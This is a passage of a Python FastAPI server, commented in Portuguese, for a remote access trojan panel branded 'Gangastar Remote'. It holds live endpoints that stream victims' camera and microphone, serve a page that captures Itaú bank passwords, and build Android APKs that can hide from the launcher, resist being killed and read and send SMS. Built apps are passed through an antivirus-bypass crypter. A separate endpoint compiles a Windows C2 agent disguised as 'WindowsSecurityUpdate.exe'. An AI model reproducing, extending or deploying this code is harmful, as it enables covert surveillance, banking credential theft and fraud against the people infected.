    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no camera WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_camera_client(device_id, websocket)


@app.websocket("/ws/microphone/{device_id}")
async def microphone_stream(websocket: WebSocket, device_id: str):
    """🎤 WebSocket que entrega chunks de áudio em tempo real"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_audio_client(device_id, websocket)
    
    try:
        while True:
            try:
                audio_chunk = await asyncio.wait_for(queue.get(), timeout=30.0)
                await websocket.send_bytes(audio_chunk)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                raise
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no microphone WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_audio_client(device_id, websocket)

# ==================== PAINEL WEB ====================

def serve_spa_html():
    """Retorna o index.html do frontend buildado com headers anti-cache"""
    frontend_path = Path(__file__).parent / "web-dist" / "index.html"
    if frontend_path.exists():
        response = FileResponse(frontend_path, media_type="text/html")
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        return response
    else:
        return HTMLResponse("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>RAT - Painel de Controle</title>
            <style>
                body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { text-align: center; }
                h1 { color: #e94560; }
                p { color: #aaa; }
                code { background: #333; padding: 10px; border-radius: 5px; display: block; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ Frontend não buildado</h1>
                <p>Execute o comando abaixo para buildar o frontend:</p>
                <code>cd server/web-app && npm run build</code>
            </div>
        </body>
        </html>
        """)

@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    """Serve o painel web na raiz"""
    return serve_spa_html()

@app.get("/login", response_class=HTMLResponse)
async def serve_login():
    """Serve a página de login"""
    return serve_spa_html()

@app.get("/gangastar-logo.svg")
async def serve_gangastar_logo_new():
    """Logo estatico do painel Gangastar Remote."""
    logo_path = Path(__file__).parent / "web-dist" / "gangastar-logo.svg"
    if not logo_path.exists():
        logo_path = Path(__file__).parent / "web-dist" / "gangstar-logo.svg"
    if logo_path.exists():
        return FileResponse(logo_path, media_type="image/svg+xml")
    raise HTTPException(status_code=404, detail="Logo nao encontrado")

@app.get("/gangstar-banner-bg.jpg")
async def serve_banner_bg():
    banner_path = Path(__file__).parent / "web-dist" / "gangstar-banner-bg.jpg"
    if banner_path.exists():
        return FileResponse(banner_path, media_type="image/jpeg")
    raise HTTPException(status_code=404, detail="Banner nao encontrado")

@app.get("/gangstar-bat-avatar.png")
async def serve_avatar():
    avatar_path = Path(__file__).parent / "web-dist" / "gangstar-bat-avatar.png"
    if not avatar_path.exists():
        avatar_path = Path(__file__).parent / "web-app" / "src" / "assets" / "gangstar-bat-avatar.png"
    if avatar_path.exists():
        return FileResponse(avatar_path, media_type="image/png")
    raise HTTPException(status_code=404, detail="Avatar nao encontrado")

@app.get("/gangstar-logo.svg")
async def serve_gangastar_logo():
    """Logo estatico do painel Gangastar Remote (web-dist) - retrocompatibilidade."""
    logo_path = Path(__file__).parent / "web-dist" / "gangastar-logo.svg"
    if not logo_path.exists():
        logo_path = Path(__file__).parent / "web-dist" / "gangstar-logo.svg"
    if logo_path.exists():
        return FileResponse(logo_path, media_type="image/svg+xml")
    raise HTTPException(status_code=404, detail="Logo nao encontrado")

@app.get("/admin", response_class=HTMLResponse)
async def serve_admin():
    """Serve a página de admin"""
    return serve_spa_html()

@app.get("/dashboard", response_class=HTMLResponse)
async def serve_dashboard():
    """Serve o dashboard"""
    return serve_spa_html()

@app.get("/device/{device_id}", response_class=HTMLResponse)
async def serve_device_control(device_id: str):
    """Serve a página de controle de dispositivo"""
    return serve_spa_html()

@app.get("/build-apk", response_class=HTMLResponse)
async def serve_build_apk():
    """Serve a página de build APK"""
    return serve_spa_html()

@app.get("/itau_senha.html", response_class=HTMLResponse)
async def serve_itau_senha():
    """Serve a página de captura da senha do Itaú"""
    file_path = Path(__file__).parent / "web-dist" / "itau_senha.html"
    if not file_path.exists():
        file_path = Path(__file__).parent / "web-app" / "public" / "itau_senha.html"
    if file_path.exists():
        return FileResponse(file_path, media_type="text/html")
    raise HTTPException(status_code=404, detail="itau_senha.html não encontrado")

# ==================== API DE CONSTRUÇÃO DE APK ====================

# Fila de builds em background
import concurrent.futures
build_executor = concurrent.futures.ThreadPoolExecutor(max_workers=2, thread_name_prefix="apk_builder")
def create_smooth_progress_ticker(target_dict: dict, build_id: str, start_pct: int = 30, max_pct: int = 88, interval_sec: float = 1.2):
    """
    Thread em background para fazer a barra de progresso do APK subir suavemente
    de 30% a 88% sem travar nos 30%!
    """
    messages_map = [
        (35, "Processando manifestos e empacotando assets..."),
        (45, "Compilando recursos Android e bytecode DEX..."),
        (55, "Executando tarefas de compilação Gradle..."),
        (65, "Processando bibliotecas e classes Java/Kotlin..."),
        (75, "Otimizando APK e alinhando estrutura zip..."),
        (82, "Assinando APK com chave de segurança..."),
        (88, "Finalizando empacotamento e verificando assinaturas...")
    ]
    stop_event = threading.Event()
    
    def run_ticker():
        idx = 0
        current_pct = start_pct
        while not stop_event.is_set():
            time.sleep(interval_sec)
            if stop_event.is_set():
                break
            if build_id in target_dict and target_dict[build_id].get("status") == "building":
                current_pct += 2
                if idx < len(messages_map) and current_pct >= messages_map[idx][0]:
                    target_dict[build_id]["message"] = messages_map[idx][1]
                    idx = min(idx + 1, len(messages_map) - 1)
                
                target_dict[build_id]["progress"] = min(current_pct, max_pct)
    
    t = threading.Thread(target=run_ticker, daemon=True)
    t.start()
    return stop_event.set

build_status = {}  # {build_id: {"status": "building/done/error", "progress": 0-100, "result": {...}}}

def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_id: int, owner_username: str, webview_url: str = None, hide_from_launcher: bool = False, enable_anti_kill: bool = True, language: str = "pt", enable_camera: bool = True, enable_contacts: bool = True, enable_send_sms: bool = True, enable_read_sms: bool = True, package_name: str = None):
    """Executa build de APK em background"""
    try:
        build_status[build_id] = {"status": "building", "progress": 10, "message": "Iniciando..."}
        
        # Cria diretório temporário
        temp_dir = tempfile.mkdtemp()
        icon_path = os.path.join(temp_dir, "icon.png") if icon_data else None
        
        if icon_path and icon_data:
            with open(icon_path, "wb") as f:
                f.write(icon_data)
        
        build_status[build_id]["progress"] = 20
        build_status[build_id]["message"] = "Preparando projeto..."
        
        # Caminho do projeto Android
        server_dir = os.path.dirname(os.path.abspath(__file__))
        project_dir = os.path.join(server_dir, "..", "android-rat")
        
        # URL do servidor (VPS)
        ngrok_url = gangstar_env.public_ws_url(f"build_id={build_id}")
        
        build_status[build_id]["progress"] = 30
        build_status[build_id]["message"] = "Processando manifestos e empacotando assets..."
        
        # Inicia ticker em background para avançar a barra suavemente de 30% a 88% sem travar
        stop_ticker = create_smooth_progress_ticker(build_status, build_id, 30, 88)

        # Constrói APK
        safe_app_name = re.sub(r'[^a-zA-Z0-9_-]', '_', app_name.strip()) or "app"
        builder = APKBuilder(project_dir, ngrok_url)
        output_apk = os.path.join(temp_dir, f"{safe_app_name}.apk")
        
        success = builder.build_custom_apk(
            app_name=app_name,
            icon_path=icon_path,
            output_path=output_apk,
            webview_url=webview_url,
            hide_from_launcher=hide_from_launcher,
            enable_anti_kill=enable_anti_kill,
            language=language,
            enable_camera=enable_camera,
            enable_contacts=enable_contacts,
            enable_send_sms=enable_send_sms,
            enable_read_sms=enable_read_sms,
            package_name=package_name
        )
        
        stop_ticker()
        
        if not success:
            build_status[build_id] = {"status": "error", "progress": 0, "message": "Erro na compilação"}
            return
        
        build_status[build_id]["progress"] = 90
        build_status[build_id]["message"] = "Aplicando Bypass e Obfuscação GANGSTAR v6..."
        
        apk_to_deploy = output_apk
        try:
            bypass_dir = os.path.join(server_dir, "projeto_bypass")
            if bypass_dir not in sys.path:
                sys.path.insert(0, bypass_dir)
            from crypter_engine import process_apk
            
            crypted_apk = process_apk(output_apk, build_id)
            if crypted_apk and os.path.exists(crypted_apk):
                apk_to_deploy = crypted_apk
                logger.info(f"[BYPASS v6] APK {build_id} processado com sucesso pelo novo Bypass!")
        except Exception as bypass_err:
            logger.error(f"[BYPASS v6] Aviso ao aplicar Bypass no APK: {bypass_err}")
        
        # Copia APK para pasta de downloads com ID único para evitar cache de ícone e arquivo
        downloads_dir = os.path.join(server_dir, "downloads")
        os.makedirs(downloads_dir, exist_ok=True)
        
        apk_filename = f"{safe_app_name}_{build_id}.apk"
        final_apk = os.path.join(downloads_dir, apk_filename)
        shutil.copy(apk_to_deploy, final_apk)
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        build_status[build_id] = {
            "status": "done",
            "progress": 100,
            "message": "Concluído!",
            "result": {
                "apk_name": apk_filename,
                "download_url": f"/api/download-apk/{apk_filename}",
                "build_id": build_id,
                "owner": owner_username
            }
        }
        logger.info(f"[OK] APK construido em background: {app_name} (build_id: {build_id})")
        
    except Exception as e:
        logger.error(f"[ERRO] Erro no build em background: {e}")
        build_status[build_id] = {"status": "error", "progress": 0, "message": str(e)}

@app.post("/api/build-apk")
async def build_custom_apk(
    app_name: str = Form(...),
    icon: Union[UploadFile, str, None] = File(None),
    webview_url: str = Form(None),
    hide_from_launcher: bool = Form(False),
    enable_anti_kill: bool = Form(True),
    language: str = Form("pt"),
    enable_camera: bool = Form(True),
    enable_contacts: bool = Form(True),
    enable_send_sms: bool = Form(True),
    enable_read_sms: bool = Form(True),
    package_name: str = Form(None),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Inicia build de APK em background (não bloqueia o servidor)
    """
    import uuid
    from models import APKBuild
    
    try:
        # Gera build_id único
        build_id = str(uuid.uuid4())[:8].upper()
        
        logger.info(f"[BUILD] Iniciando build de APK em background: {app_name} (pkg: {package_name}, usuario: {current_user.username}, idioma: {language}, anti_kill: {enable_anti_kill})")
        
        icon_data = None
        if icon:
            if hasattr(icon, "read"):
                raw_data = await icon.read()
                if raw_data and len(raw_data) > 0:
                    icon_data = raw_data
            elif isinstance(icon, bytes):
                icon_data = icon
            elif isinstance(icon, str) and icon.startswith("data:image"):
                import base64
                header, b64data = icon.split(",", 1)
                icon_data = base64.b64decode(b64data)
        
        if icon_data:
            logger.info(f"[BUILD-ICON] Recebido ícone customizado com {len(icon_data)} bytes!")
        else:
            logger.warning(f"[BUILD-ICON] Nenhum ícone customizado foi recebido ou lido (icon={type(icon)})")
        
        # Salva build no banco
        apk_build = APKBuild(
            build_id=build_id,
            owner_id=current_user.id,
            app_name=app_name
        )
        db.add(apk_build)
        db.commit()
        
        logger.info(f"[REG] Build registrado: {build_id} -> usuario {current_user.username}")
        
        # Inicializa status síncrono para evitar 404 em enquetes imediatas do cliente
        build_status[build_id] = {
            "status": "building",
            "progress": 5,
            "message": "Iniciando build em background..."
        }

        # Inicia build em background (não bloqueia!)
        build_executor.submit(
            build_apk_background,
            build_id, app_name, icon_data, current_user.id, current_user.username, webview_url, hide_from_launcher, enable_anti_kill, language, enable_camera, enable_contacts, enable_send_sms, enable_read_sms, package_name
        )
        
        # Retorna imediatamente
        return {
            "status": "building",
            "message": f"Build iniciado em background",
            "build_id": build_id,
            "check_status_url": f"/api/build-status/{build_id}"
        }
        
    except Exception as e:
        logger.error(f"[ERRO] Erro ao iniciar build: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/build-status/{build_id}")
async def get_build_status(build_id: str, current_user: Operator = Depends(get_current_user), db: Session = Depends(get_db)):
    """Verifica status do build de APK"""
    if build_id not in build_status:
        from models import APKBuild
        apk_b = db.query(APKBuild).filter(APKBuild.build_id == build_id).first()
        if apk_b:
            return {
                "status": "building",
                "progress": 10,
                "message": "Processando build..."
            }
        raise HTTPException(status_code=404, detail="Build não encontrado")
    
    status = build_status[build_id]
    
    # Se concluído, retorna resultado completo
    if status["status"] == "done":
        return {
            "status": "success",
            "progress": 100,
            "message": "APK construído com sucesso!",
            **status["result"]
        }
    elif status["status"] == "error":
        return {
            "status": "error",
            "progress": 0,
            "message": status["message"]
        }
    else:
        return {
            "status": "building",
            "progress": status["progress"],
            "message": status["message"]
        }

@app.get("/api/download-apk/{apk_name}")
async def download_apk(apk_name: str, token: Optional[str] = Query(None)):
    """
    Baixa APK construído com suporte a download direto pelo navegador e busca flexível de arquivo.
    """
    safe_name = os.path.basename(apk_name)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    apk_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not os.path.exists(apk_path):
        if os.path.exists(downloads_dir):
            clean_target = safe_name.replace(".apk", "")
            for fname in os.listdir(downloads_dir):
                if fname.endswith(".apk"):
                    clean_fname = fname.replace(".apk", "")
                    if clean_target in clean_fname or clean_fname in clean_target:
                        apk_path = os.path.join(downloads_dir, fname)
                        safe_name = fname
                        break

    if not apk_path.startswith(downloads_dir) or not os.path.exists(apk_path):
        raise HTTPException(status_code=404, detail="APK não encontrado")
    
    return FileResponse(
        apk_path,
        media_type="application/vnd.android.package-archive",
        filename=safe_name
    )

class BuildEXEPayload(BaseModel):
    c2_host: Optional[str] = None
    c2_port: Optional[int] = 8000
    use_ssl: Optional[bool] = False
    build_id: Optional[str] = "win-001"
    output_name: Optional[str] = "WindowsSecurityUpdate.exe"
    hide_console: Optional[bool] = True
    decoy_url: Optional[str] = ""
    decoy_message: Optional[str] = ""

@app.post("/api/build-exe")
async def build_windows_exe_endpoint(
    request: Request,
    payload: BuildEXEPayload,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Compila o agente Windows (win_agent.py) em um executável standalone (.exe)
    """
    try:
        host = payload.c2_host
        if not host:
            host_header = request.headers.get("host", "127.0.0.1")
            host = host_header.split(":")[0]

        sys.path.append(os.path.join(os.path.dirname(__file__), "windows_agent"))
        from windows_agent.builder_exe import build_windows_exe
        from models import APKBuild

        import re
        raw_output = re.sub(r'[^a-zA-Z0-9_-]', '', (payload.output_name or "WindowsAgent").replace(".exe", ""))
        if not raw_output:
            raw_output = "WindowsAgent"
        output_name = f"{raw_output}.exe"
        
        exe_build_id = payload.build_id or f"win-{current_user.id}"
        try:
            apk_build = APKBuild(
                build_id=exe_build_id,
                owner_id=current_user.id,
                app_name=output_name
            )
            db.add(apk_build)
            db.commit()
        except Exception as ex:
            logger.warning(f"[EXE-BUILD] Aviso ao salvar APKBuild: {ex}")

        success, result_path = await asyncio.to_thread(
            build_windows_exe,
            c2_host=host,
            c2_port=payload.c2_port or 8000,
            use_ssl=payload.use_ssl or False,
            build_id=exe_build_id,
            output_name=output_name,
            hide_console=payload.hide_console if payload.hide_console is not None else True,
            decoy_url=payload.decoy_url or "",
            decoy_message=payload.decoy_message or ""
        )

        if not success:
            raise HTTPException(status_code=500, detail=f"Erro ao compilar .exe: {result_path}")

        download_filename = os.path.basename(result_path)
        download_url = f"/api/downloads/{download_filename}"

        return {
            "success": True,
            "message": "Executável Windows compilado com sucesso!",
            "download_url": download_url,
            "filename": download_filename
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Erro ao compilar EXE Windows: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/downloads/{filename}")
async def download_generic_file(filename: str):
    """
    Download direto de arquivos gerados (EXE, APK, etc) com proteção contra Path Traversal
    """
    safe_name = os.path.basename(filename)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    file_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not file_path.startswith(downloads_dir) or not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="Arquivo não encontrado")
    
    media_type = "application/x-msdownload" if safe_name.endswith(".exe") else "application/octet-stream"
    return FileResponse(
        file_path,
        media_type=media_type,
        filename=safe_name
    )


@app.get("/api/build-status")
async def get_latest_build_status(current_user: Operator = Depends(get_current_user)):
    """
    Retorna status do último build
    """
    import os
    server_dir = os.path.dirname(os.path.abspath(__file__))
    apk_path = os.path.join(server_dir, "web", "rat-app.apk")
    
    if os.path.exists(apk_path):
        stat = os.stat(apk_path)
        return {
            "exists": True,
            "size": stat.st_size,
            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
            "download_url": "/web/rat-app.apk"
        }
    else:
        return {
            "exists": False
        }

# ==================== LAYOUT PREFERENCES ====================

@app.get("/api/user/layout")
async def get_user_layout(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna as preferências de layout do usuário
    """
    prefs = db.query(UserLayoutPreferences).filter(
        UserLayoutPreferences.user_id == current_user.id
    ).first()
    
    if prefs and prefs.layout_data:
        try:
            return {"layout": json.loads(prefs.layout_data)}
        except:
            return {"layout": None}
    
    return {"layout": None}

@app.post("/api/user/layout")
async def save_user_layout(
    layout_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Salva as preferências de layout do usuário
    """
    try:
        prefs = db.query(UserLayoutPreferences).filter(
            UserLayoutPreferences.user_id == current_user.id
        ).first()
        
        if prefs:
            prefs.layout_data = json.dumps(layout_data)
            prefs.updated_at = utc_now()
        else:
            prefs = UserLayoutPreferences(
                user_id=current_user.id,
                layout_data=json.dumps(layout_data)
            )
            db.add(prefs)
        
        db.commit()
        return {"status": "ok", "message": "Layout salvo com sucesso"}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Erro ao salvar layout: {str(e)}")

@app.delete("/api/user/layout")
async def reset_user_layout(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Reseta as preferências de layout do usuário para o padrão
    """
    try:
        prefs = db.query(UserLayoutPreferences).filter(
            UserLayoutPreferences.user_id == current_user.id
        ).first()
        
        if prefs:
            db.delete(prefs)
            db.commit()
        
        return {"status": "ok", "message": "Layout resetado para padrão"}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Erro ao resetar layout: {str(e)}")

# ==================== APK BUILDER VISUAL ====================

from models import APKTemplate, APKVisualBuild

@app.get("/api/apk-templates")
async def get_apk_templates(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna templates de APK do usuário
    """
    templates = db.query(APKTemplate).filter(
        (APKTemplate.owner_id == current_user.id) | (APKTemplate.is_public == True)
    ).all()
    
    result = []
    for t in templates:
        result.append({
            "id": t.id,
            "template_id": t.template_id,
            "name": t.name,
            "description": t.description,
            "app_name": t.app_name,
            "package_name": t.package_name,
            "is_public": t.is_public,
            "is_owner": t.owner_id == current_user.id,
            "created_at": t.created_at.isoformat(),
            "updated_at": t.updated_at.isoformat() if t.updated_at else None
        })
    
    return result

@app.post("/api/apk-templates")
async def create_apk_template(
    template_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Cria novo template de APK visual
    """
    import uuid
    
    try:
        template_id = str(uuid.uuid4())[:16]
        
        template = APKTemplate(
            template_id=template_id,
            owner_id=current_user.id,
            name=template_data.get("name", "Novo Template"),
            description=template_data.get("description", ""),
            app_name=template_data.get("appName", "Meu App"),
            package_name=template_data.get("packageName", "com.app.novo"),
            template_data=json.dumps(template_data.get("screens", [])),
            theme_data=json.dumps(template_data.get("theme", {})),
            is_public=template_data.get("is_public", False)
        )
        
        db.add(template)
        db.commit()
        db.refresh(template)
        
        logger.info(f"📦 Template criado: {template.name} (ID: {template_id}) por {current_user.username}")
        
        return {
            "status": "ok",
            "template_id": template_id,
            "message": "Template criado com sucesso"
        }
        
    except Exception as e:
        db.rollback()
        logger.error(f"Erro ao criar template: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/apk-templates/{template_id}")
async def get_apk_template(
    template_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna template específico com todos os dados
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    # Verifica acesso
    if template.owner_id != current_user.id and not template.is_public:
        raise HTTPException(status_code=403, detail="Acesso negado")
    
    return {
        "id": template.id,
        "template_id": template.template_id,
        "name": template.name,
        "description": template.description,
        "app_name": template.app_name,
        "package_name": template.package_name,
        "screens": json.loads(template.template_data) if template.template_data else [],
        "theme": json.loads(template.theme_data) if template.theme_data else {},
        "is_public": template.is_public,
        "created_at": template.created_at.isoformat(),
        "updated_at": template.updated_at.isoformat() if template.updated_at else None
    }

@app.put("/api/apk-templates/{template_id}")
async def update_apk_template(
    template_id: str,
    template_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Atualiza template existente
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    if template.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Apenas o dono pode editar")
    
    try:
        if "name" in template_data:
            template.name = template_data["name"]
        if "description" in template_data:
            template.description = template_data["description"]
        if "appName" in template_data:
            template.app_name = template_data["appName"]
        if "packageName" in template_data:
            template.package_name = template_data["packageName"]
        if "screens" in template_data:
            template.template_data = json.dumps(template_data["screens"])
        if "theme" in template_data:
            template.theme_data = json.dumps(template_data["theme"])
        if "is_public" in template_data:
            template.is_public = template_data["is_public"]
        
        template.updated_at = utc_now()
        db.commit()
        
        return {"status": "ok", "message": "Template atualizado"}
        
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/apk-templates/{template_id}")
async def delete_apk_template(
    template_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Exclui template
    """
    template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
    
    if not template:
        raise HTTPException(status_code=404, detail="Template não encontrado")
    
    if template.owner_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Acesso negado")
    
    db.delete(template)
    db.commit()
    
    return {"status": "ok", "message": "Template excluído"}

# Fila de builds visuais
visual_build_status = {}

def build_visual_apk_background(build_id: str, template_data: dict, owner_id: int, db_session, icon_data: bytes = None, enable_anti_kill: bool = True, language: str = "pt"):
    """
    Constrói APK visual em background baseado no template
    Usa o mesmo sistema de build do APK normal (Gradle)
    """
    try:
        visual_build_status[build_id] = {"status": "building", "progress": 5, "message": "Iniciando..."}
        
        # Cria diretório temporário
        temp_dir = tempfile.mkdtemp()
        
        # Extrai dados do template
        screens = template_data.get("screens", [])
        theme = template_data.get("theme", {})
        app_name = template_data.get("appName", "App")
        request_admin = template_data.get("requestAdmin", False)
        
        visual_build_status[build_id] = {"status": "building", "progress": 10, "message": "Preparando configuração..."}
        
        # Caminhos do projeto
        server_dir = os.path.dirname(os.path.abspath(__file__))
        project_dir = os.path.join(server_dir, "..", "android-rat")
        
        # 1. Salva configuração de telas no assets do Android para o app ler
        visual_build_status[build_id] = {"status": "building", "progress": 15, "message": "Salvando configuração de telas..."}
        
        assets_dir = os.path.join(project_dir, "app", "src", "main", "assets")
        os.makedirs(assets_dir, exist_ok=True)
        
        config_path = os.path.join(assets_dir, "visual_config.json")
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump({
                "screens": screens,
                "theme": theme,
                "appName": app_name,
                "build_id": build_id
            }, f, ensure_ascii=False, indent=2)
        
        logger.info(f"[CONFIG] Configuração visual salva em: {config_path}")
        
        visual_build_status[build_id] = {"status": "building", "progress": 25, "message": "Processando ícone do aplicativo..."}
        
        # 2. Processa ícone do aplicativo (usa o fornecido ou gera fallback)
        icon_path = os.path.join(temp_dir, "icon.png")
        
        if icon_data and len(icon_data) > 100:
            with open(icon_path, "wb") as f:
                f.write(icon_data)
            logger.info(f"[VISUAL-ICON] Usando ícone personalizado recebido ({len(icon_data)} bytes)")
        else:
            primary_color = theme.get("primaryColor", "#FF6600")
            try:
                from PIL import Image, ImageDraw
                size = 512
                img = Image.new('RGBA', (size, size), primary_color)
                draw = ImageDraw.Draw(img)
                margin = size // 4
                draw.ellipse([margin, margin, size - margin, size - margin], fill='white')
                img.save(icon_path, 'PNG')
            except Exception as e:
                logger.warning(f"[WARN] Erro ao criar ícone: {e}, usando ícone padrão")
                default_icon = os.path.join(project_dir, "app", "src", "main", "res", "mipmap-xxxhdpi", "ic_launcher.png")
                if os.path.exists(default_icon):
                    shutil.copy(default_icon, icon_path)
                else:
                    icon_path = None
        
        visual_build_status[build_id] = {"status": "building", "progress": 30, "message": "Iniciando compilação Gradle..."}
        stop_visual_ticker = create_smooth_progress_ticker(visual_build_status, build_id, 30, 88)
        
        # 3. Usa o APKBuilder existente para compilar
        ngrok_url = gangstar_env.public_ws_url(f"build_id={build_id}")
        
        from apk_builder import APKBuilder
        builder = APKBuilder(project_dir, ngrok_url)
        
        # Define caminho de saída
        downloads_dir = os.path.join(server_dir, "downloads")
        os.makedirs(downloads_dir, exist_ok=True)
        
        final_apk_name = f"{app_name.lower().replace(' ', '-')}-visual.apk"
        final_apk = os.path.join(downloads_dir, final_apk_name)
        
        # Compila usando o método build_visual_apk para embedar as telas desenhadas no visual_config.json!
        success = builder.build_visual_apk(
            app_name=app_name,
            icon_path=icon_path,
            output_path=final_apk,
            visual_config_json=template_data,
            hide_from_launcher=False,
            enable_anti_kill=enable_anti_kill,
            language=language
        )
        
        stop_visual_ticker()
        
        # Remove arquivo de configuração do assets após build
        try:
            os.remove(config_path)
        except:
            pass
        
        # Limpa temp
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        if success:
            visual_build_status[build_id]["progress"] = 90
            visual_build_status[build_id]["message"] = "Aplicando Bypass e Obfuscação GANGSTAR v6..."
            
            try:
                bypass_dir = os.path.join(server_dir, "projeto_bypass")
                if bypass_dir not in sys.path:
                    sys.path.insert(0, bypass_dir)
                from crypter_engine import process_apk
                
                crypted_apk = process_apk(final_apk, build_id)
                if crypted_apk and os.path.exists(crypted_apk):
                    shutil.copy(crypted_apk, final_apk)
                    logger.info(f"[BYPASS v6] APK Visual {build_id} processado com sucesso pelo novo Bypass!")
            except Exception as bypass_err:
                logger.error(f"[BYPASS v6] Aviso ao aplicar Bypass no APK Visual: {bypass_err}")

            visual_build_status[build_id] = {
                "status": "done",
                "progress": 100,
                "message": "APK pronto!",
                "result": {
                    "apk_name": final_apk_name,
                    "download_url": f"/api/download-apk/{final_apk_name}",
                    "build_id": build_id
                }
            }
            logger.info(f"[OK] APK Visual construído com Gradle & Bypass v6: {app_name} (build_id: {build_id})")
        else:
            visual_build_status[build_id] = {
                "status": "error",
                "progress": 0,
                "message": "Erro na compilação Gradle. Verifique os logs."
            }
        
    except Exception as e:
        logger.error(f"[ERRO] Erro no build visual: {e}")
        import traceback
        traceback.print_exc()
        visual_build_status[build_id] = {"status": "error", "progress": 0, "message": str(e)}

@app.post("/api/build-apk-visual")
async def build_visual_apk(
    template: str = Form(...),
    app_name: str = Form(...),
    icon: Union[UploadFile, str, None] = File(None),
    enable_anti_kill: bool = Form(True),
    language: str = Form("pt"),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Inicia build de APK visual baseado no template
    """
    import uuid, base64
    
    try:
        build_id = str(uuid.uuid4())[:8].upper()
        template_data = json.loads(template)
        
        # Se a linguagem foi fornecida dentro do template JSON, prioriza
        if isinstance(template_data, dict) and template_data.get("language"):
            language = template_data.get("language")
        
        logger.info(f"[BUILD-VISUAL] Iniciando build: {app_name} (usuario: {current_user.username}, idioma: {language}, anti_kill: {enable_anti_kill})")
        
        icon_data = None
        if isinstance(icon, UploadFile) and icon.filename:
            raw_data = await icon.read()
            if raw_data and len(raw_data) > 100:
                icon_data = raw_data
        elif isinstance(template_data, dict) and template_data.get("appIcon"):
            app_icon_str = template_data.get("appIcon")
            if app_icon_str and app_icon_str.startswith("data:image"):
                try:
                    header, b64data = app_icon_str.split(",", 1)
                    icon_data = base64.b64decode(b64data)
                except Exception as ex:
                    logger.warning(f"[WARN] Erro ao decodificar base64 appIcon: {ex}")
        
        # Salva build no banco
        visual_build = APKVisualBuild(
            build_id=build_id,
            owner_id=current_user.id,
            app_name=app_name,
            build_data=template,
            status="building"
        )
        db.add(visual_build)
        db.commit()
        
        # Inicia build em background
        build_executor.submit(
            build_visual_apk_background,
            build_id, template_data, current_user.id, None, icon_data, enable_anti_kill, language
        )
        
        return {
            "status": "building",
            "message": "Build visual iniciado",
            "build_id": build_id,
            "check_status_url": f"/api/build-visual-status/{build_id}"
        }
        
    except Exception as e:
        logger.error(f"[ERRO] Erro ao iniciar build visual: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/build-visual-status/{build_id}")
async def get_visual_build_status(
    build_id: str,
    current_user: Operator = Depends(get_current_user)
):
    """
    Retorna status do build visual
    """
    if build_id not in visual_build_status:
        raise HTTPException(status_code=404, detail="Build não encontrado")
    
    status = visual_build_status[build_id]
    
    if status["status"] == "done":
        return {
            "status": "success",
            "progress": 100,
            "message": "APK construído com sucesso!",
            **status.get("result", {})
        }
    elif status["status"] == "error":
        return {
            "status": "error",
            "progress": 0,
            "message": status["message"]
        }
    else:
        return {
            "status": "building",
            "progress": status["progress"],
            "message": status["message"]
        }

